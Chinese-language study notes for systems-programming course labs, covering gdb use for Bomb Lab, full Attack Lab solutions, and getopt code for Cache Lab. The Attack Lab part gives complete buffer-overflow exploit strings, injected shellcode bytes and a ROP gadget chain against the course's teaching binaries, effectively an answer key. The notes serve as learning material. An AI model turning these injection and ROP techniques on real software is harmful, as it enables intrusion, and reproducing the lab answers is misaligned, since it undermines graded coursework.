## Data Lab
See datalab.ppt

## Bomb Lab

### 1. 常用命令
```shell
> tar -xvf bombk.tar 解压文件
> chmod +x bomb 设置可执行位 (对应八进制最低有效位001)
> ./bomb 运行炸弹
> ./bomb psol.txt 将 psol.txt 的内容作为输入
> objdump -t 打印文件的 symbol tabel
> objdump -d 反汇编文件
> strings 打印 printable strings
```

### 2. gdb 命令
![](Pasted%20image%2020251212113631.png)

(直接回车会重复执行上一条命令)

启动 `gdb bomb` 之后, 一般先用 `layout asm, layout regs` 开启视图方便分析

用`b explode_bomb`在炸弹爆炸位置打上断点, 防止炸弹爆炸.

`p` 命令用于打印表达式, `x` 命令用于检查内存的内容

![](Pasted%20image%2020251212114041.png)

在 `/` 后面的后缀制定了查看内存的方式和数量:

- 第一个数字, 如 `2` 指定要查看的单位数量
- 第二个字母 (`x`, `d` 等) 制定单位类型和显示格式
  - c/d/x 表示应该以 character/decimal/hexadecimal 格式显式
  - s 表示应该以 c-style string 显示
  - b/h/w/g 表示应该以 byte/2byte(half-word)/4byte(word)/8byte(giant) 为单位显示(之后的打印都会以这个单位, 直到使用新的单位打印)

.gdbinit 可以让用户在开始时使用一些默认配置

![](Pasted%20image%2020251212114640.png)

![](Pasted%20image%2020251212114712.png)

`mkdir -p` 代表如果父目录不存在一并创建

## Attack Lab
### 0. 背景
通过缓冲区溢出植入返回地址/gadget代码

### 1. 常用命令
```shell
> ./ctarget ./rtarget ./starget target程序
> ./ctarget -h 打印可用命令行参数
> ./ctarget -i FILE 使用 FILE 文件作为输入
> ./ctarget -q 本地攻击
```

>[!note] 
> exploit string 不能有 `0x0a` , 因为这是 '\n' 的 ASCII 码, 会中断 Gets

### 2. HEX2RAW
Hex2raw 接受一个十六进制形式的字符串, 每个比特用两位十六进制数表示, 以空格隔开, 返回一个 ASCII码为对应字符串的字符串. (0 也必须用 00)

例如 `"012345"` 的十六进制形式是 `30 31 32 33 34 35 00`

如果你想注释, 请在 `/*` 和 `*/` 的后面/前面留下一个空格.

可以有几种方式将 raw string 传给 ctarget/rtarget/starget

```shell
> cat exploit.txt | ./hex2raw | ./ctarget // using pipe
> ./hex2raw < exploit.txt > exploit-raw.txt // using I/O redirection
> ./ctarget < exploit-raw.txt
> gdb can also do this
> (gdb) run < exploit-raw.txt
> ./ctarget -i exploit-raw.txt // or use cmdline argument
```

### 3. 生成 Byte Codes

利用 GCC 作为汇编器, OBJDUMP 作为反汇编器可以简单地生成 byte codes.

例如, 我们可以写一个 `example.s` 包含以下汇编代码.

```assemble
pushq $0xabcdef # Push value onto stack
addq $17, %rax # Add 17 to %rax
movl %eax, %eax # Copy lower 32 bits to %edx
```

接着利用 gcc 和 objdump 生成反汇编文件.

```shell
> gcc -c example.s
> objdump -d example.o > example.d
```

`example.d` 会包含以下内容:

![](Pasted%20image%2020251212205433.png)

这样我们就得到汇编代码的 byte code 了:

`68 ef cd ab 00 48 83 c0 11 89 c2`

拿到 HEX2RAW 生成 对应的输入字符串就可以进行攻击了.

> [!note] GCC 常用参数:
> - gcc -c hello.c 激活预处理, 编译和汇编, 生成 .o 的 obj 文件
> - gcc -S hello.c 激活预处理, 编译, 把文件编译成 .s 的汇编代码
> - gcc -E hello.c > hello.txt 只激活预处理, 不生成文件, 需要重定向
> - gcc -o 制定目标名称

### 4. Phase 1
注意 `touch1` 的地址是 0x0000000000401d1d , 所以我们要让返回地址变成这个.

注意植入的顺序, 因为机器是小端法, 而栈是向低地址增长, 字符串植入的时候是向上增长, 所以前面读到的位对应的是低地址.

如果要植入0x0000000000401d1d, 就要输入 `1d 1d 40 00 00 00 00 00` 

可以从汇编代码看出 bufsize 是 56, 所以前面可以先填充 56 个 0

答案:

```text
00 01 02 03 04 05 06 07
00 01 02 03 04 05 06 07
00 01 02 03 04 05 06 07
00 01 02 03 04 05 06 07
00 01 02 03 04 05 06 07
00 01 02 03 04 05 06 07
00 01 02 03 04 05 06 07
1d 1d 40 00 00 00 00 00
```

### 5. Phase 2
Phase2 需要把 cookie 传入 touch2 中.

利用汇编命令

```asm
mov $0x71b890e0, %rdi
pushq $0x401d51
ret
```

栈上的返回地址要定位到读入位置的地址, 即一开始 $rsp-0x38 的值, 这样才可以执行我们植入的代码.

```text
48 c7 c7 e0 90 b8 71
68 51 1d 40 00
c3
00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
68 9a 61 55 00 00 00 00
```

### 6. Phase3
要把 cookie 的十六进制表示注入到某个位置. 注意低地址的是低位, 比较的时候是从头开始比较, 所以低地址应该放最高位的字符表示 ASCII 码.

```text
leaq 4096(%rsp), %rdi
movl $0x38623137, 4096(%rsp)
movl $0x30653039, 4100(%rsp)
movl $0, 4104(%rsp)
pushq $0x401e77
ret

```

### 7. ROP
将函数的代码的地址植入栈中 (如果有偏移要记得加上偏移量, 比如我们需要的代码是从这个指令的第二个字节才开始的, 地址就要+1)

利用这个代码结尾是 ret , 我们可以一直跳到执行我们植入栈中的下一条指令地址.

剩下的就是在 farm 中找 gadget 任务了

注意可以利用插入一些没有效果的指令, 比如 90 (nop), andb %al, %al 等

### 8. Phase 6

注意 memcpy(dest, source) 将 source 位置的代码复制到 dest 位置.

有一个小巧思, 注意到 memcpy 在返回时也会执行当前栈中 %rsp 处的地址, 所以我们可以利用 memcpy 将我们的地址替换为它返回的地址 (返回的地址是在 $rsp - 8) 处. 这样我们既利用了 memcpy 的复制功能, 又利用了函数返回的行为.

在 starget.s 中我们发现目的地址的计算是 %rsp + %rax, 而 %rax 是存放在 %rbp-0x1c 位置的数据, 于是我们利用缓冲区溢出更改 %rax 的值为 -8, 这样复制到的目的地址就是 %rsp-8 而不是 %rsp 了.

```text
f5 20 40 00 00 00 00 00 /* mov %rsp, %rax */ 
6d 1f 40 00 00 00 00 00 /* mov %rax, %rdi <- %rdi (buffer+64) */
83 1f 40 00 00 00 00 00 /* popq %rax */
48 00 00 00 00 00 00 00 /* offset */
8c 20 40 00 00 00 00 00 /* mov %eax, %ecx */
41 20 40 00 00 00 00 00 /* mov %ecx, %edx */
4c 20 40 00 00 00 00 00 /* mov %edx, %esi */
c2 1f 40 00 00 00 00 00 /* lea (%rdi,%rsi,1), %rax */
6d 1f 40 00 00 00 00 00 /* mov %rax, %rdi */
0c 1e 40 00 00 00 00 00 /* touch3 */
37 31 62 38 39 30 65 30 /* cookie (buffer + 136) */
00 00 00 00 00 00 00 00 /* 0 */
00 00 00 00 00 00 00 00 /* 0 */
00 00 00 00 00 00 00 00 /* 0 */
00 00 00 00 00 00 00 00 /* 0 */
00 00 00 00 00 00 00 00 /* 0 */
00 00 00 00 f8 ff ff ff /* -8 */
```

(好像还没有看到有跟我一样利用 memcpy 返回而不是 getbuf_with_canary 返回的?)

## Arch Lab
### Part A
编写 y86-64 程序.

使用 `cargo build` 构建项目, 使用 `./target/debug/yas` 进行汇编, 使用 `./target/debug/yis` 进行模拟.

## Cache Lab
### Part A
#### getopt
```c
#include <unistd.h>

int getopt(int argc, char * const argv[], const char *optstring);
```

optstring 是一个选项描述表, 每个字符代表一个合法选项. 字符后带冒号表示该选项需要参数. 带一个冒号代表必须要参数. 两个冒号代表可以有参数可以没有参数, 但是有参数的话选项和参数之间不能有空格.

返回值

返回识别到的选项字符（如 'a'、'b'）, 所有选项处理完毕后，返回 -1

错误情况

遇到未知选项或缺失参数, 默认行为：返回 '?', 并向 stderr 输出错误信息

如果想实现更精细的参数控制, 请查阅 `getopt_long`

```c
const char* optstr = "hvs:E:b:t:";

// process command line arguments.
void process_arguments(int argc, char* argv[]) {
    char arg;
    while ((arg = getopt(argc, argv, optstr)) != -1) {
        switch (arg) {
            case 'h':
                print_help_message(argv[0]);
                exit(0);
                break;
            case 'v':
                verbose_flag = true;
                break;
            case 's':
                set_index_bits = atoi(optarg);
                break;
            case 'E':
                lines_per_set = atoi(optarg);
                break;
            case 'b':
                block_offset_bits = atoi(optarg);
                break;
            case 't':
                file_name = optarg;
                break;
            case '?':
                print_help_message(argv[0]);
                exit(1);
                break;
        }
    }
    if (set_index_bits < 0 || lines_per_set <= 0 || block_offset_bits < 0) {
        printf("%s: Missing required command line argument\n", argv[0]);
        print_help_message(argv[0]);
        exit(1);
    }
    S = (uint64_t)1 << set_index_bits;
    E = lines_per_set;
    B = (uint64_t)1 << block_offset_bits;
}
```